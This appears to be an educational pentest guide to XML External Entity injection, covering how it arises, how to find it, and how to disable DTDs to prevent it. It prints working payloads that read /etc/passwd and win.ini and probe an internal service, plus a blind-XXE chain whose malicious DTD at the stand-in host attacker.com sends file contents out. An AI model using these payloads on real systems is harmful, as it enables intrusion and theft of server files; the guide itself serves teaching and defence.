# XML External Entity (XXE) Injection

XML External Entity (XXE) injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server's filesystem, and to interact with any backend or external systems that the application itself can access.

## How it Occurs

XXE vulnerabilities arise because the XML specification contains a feature called "external entities," which are a type of custom XML entity whose definition is located outside of the DTD where they are declared. If an application accepts XML input and parses it without disabling external entity resolution, it can be vulnerable to XXE.

### Example

Consider a web application that accepts XML data from the user:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>123</productId>
</stockCheck>
```

An attacker can modify the XML to include an external entity that points to a local file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

When the application parses this XML, it will replace `&xxe;` with the content of the `/etc/passwd` file. If the application then displays the product ID in its response, the attacker will be able to see the contents of the file.

## Common Payloads

### Retrieving Files

*   **Linux:** `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
*   **Windows:** `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>`

### SSRF via XXE

XXE can be used to perform Server-Side Request Forgery (SSRF) attacks.

*   `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.service/endpoint"> ]>`

### Blind XXE

In some cases, the application does not return the results of the XXE attack in its response. This is known as blind XXE. An attacker can use out-of-band techniques to exfiltrate data.

*   **Exfiltrating data via a DTD:**
    1.  The attacker hosts a malicious DTD on a server they control.
    2.  The attacker sends an XXE payload that references the malicious DTD.
    3.  The application requests the malicious DTD.
    4.  The malicious DTD contains an entity that exfiltrates data from the vulnerable server.

    **Malicious DTD (e.g., `http://attacker.com/malicious.dtd`):**
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
    %eval;
    %exfiltrate;
    ```

    **XXE Payload:**
    ```xml
    <?xml version="1.0" ?>
    <!DOCTYPE foo [
        <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
        %xxe;
    ]>
    <foo></foo>
    ```

## Finding XXE Vulnerabilities

*   Look for any functionality that accepts XML data. This can be in the body of a POST request, or in a file upload.
*   Check if the application is parsing XML. You can often tell by looking at the `Content-Type` header of the request (e.g., `application/xml`, `text/xml`).
*   Try sending a simple XXE payload to see if the application is vulnerable.

## Preventing XXE

The safest way to prevent XXE is to disable DTDs (Document Type Definitions) and external entities completely. This can usually be done in the configuration of the XML parser. If it is not possible to disable DTDs completely, then external entities and external DTDs should be disabled.

## Cheatsheet
https://cheatsheet.haax.fr/web-pentest/files-and-files-inclusions/xxe/

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<author>
  <name>ven</name>
  <origin>void</origin>
</author>
```